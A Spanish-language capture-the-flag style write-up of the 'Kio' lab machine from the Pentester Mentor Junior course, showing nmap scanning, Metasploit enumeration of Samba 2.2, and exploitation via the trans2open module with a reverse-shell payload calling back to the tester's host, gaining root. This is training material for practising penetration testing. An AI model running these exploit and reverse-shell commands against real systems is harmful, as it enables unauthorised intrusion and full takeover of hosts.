
---
title: Kio Writeup - Pentester Mentor Junior (PMJ)
date: 2025-05-11
categories: [Writeup, PMJ]
tags: [Writeup, Linux, PMJ]
image: /assets/img/commons/KioWriteup/kio_banner.png
---

# Introducción

En esta ocasión estaré resolviendo la máquina **Kio**, una máquina Linux de dificultad fácil perteneciente a la certificación **Pentester Mentor Junior (PMJ)** de la academia **Hacker Mentor**.

El objetivo de este laboratorio es poner en práctica las distintas fases de un proceso de pentesting: reconocimiento, escaneo, enumeración y explotación, hasta lograr acceso al sistema objetivo.

---

# Reconocimiento

El primer paso fue verificar que la máquina objetivo estuviera activa dentro de la red.

```bash
ping 192.168.100.79
```

![[/assets/img/commons/KioWriteup/Vista_Pagina.png]]
![[/assets/img/commons/KioWriteup/ping_ip.png]]

La respuesta del servidor confirmó que el host se encontraba disponible y listo para comenzar las siguientes fases del análisis.

---

# Escaneo

Con la conectividad confirmada, procedí a realizar un escaneo utilizando Nmap para identificar los servicios expuestos.

```bash
nmap -sV -sC 192.168.100.79
```

![[/assets/img/commons/KioWriteup/escaneo_samba.png]]

Entre los resultados obtenidos llamó mi atención el puerto **139**, asociado al servicio **Samba**.

Además, Nmap logró identificar una versión antigua del servicio, lo que sugería la posible existencia de vulnerabilidades conocidas.

---

# Enumeración

Para obtener información más detallada sobre Samba utilicé Metasploit.

```bash
msfconsole
```

Busqué un módulo que permitiera identificar la versión exacta del servicio:

```bash
search smb version
```

Seleccioné el módulo correspondiente:

```bash
use auxiliary/scanner/smb/smb_version
set RHOST 192.168.100.79
run
```

La información obtenida confirmó que la versión instalada era vulnerable.

A continuación, utilicé Searchsploit para buscar vulnerabilidades públicas asociadas a dicha versión:

```bash
searchsploit samba 2.2
```

![[/assets/img/commons/KioWriteup/busqueda_exploit.png]]

Entre los resultados apareció la vulnerabilidad **Trans2Open**, una falla conocida que permite ejecución remota de código en determinadas versiones de Samba.

---

# Explotación

Con la vulnerabilidad identificada, regresé a Metasploit para utilizar el exploit correspondiente.

```bash
search exploit/linux/samba/trans2open
```

```bash
use exploit/linux/samba/trans2open
set RHOST 192.168.100.79
```

Inicialmente el payload predeterminado no funcionó correctamente, por lo que opté por utilizar una reverse shell más sencilla.

```bash
set payload linux/x86/shell_reverse_tcp
set LHOST 192.168.100.72
set LPORT 4444
```

![[/assets/img/commons/KioWriteup/configuracion_exploit 1.png]]

Finalmente ejecuté el exploit:

```bash
exploit
```

Tras unos segundos obtuve acceso remoto al sistema.

```bash
whoami
```

![[/assets/img/commons/KioWriteup/run_exploit.png]]

La salida confirmó que se había conseguido acceso con privilegios elevados (ROOT) sobre la máquina objetivo.

---

Gracias por leer este writeup.
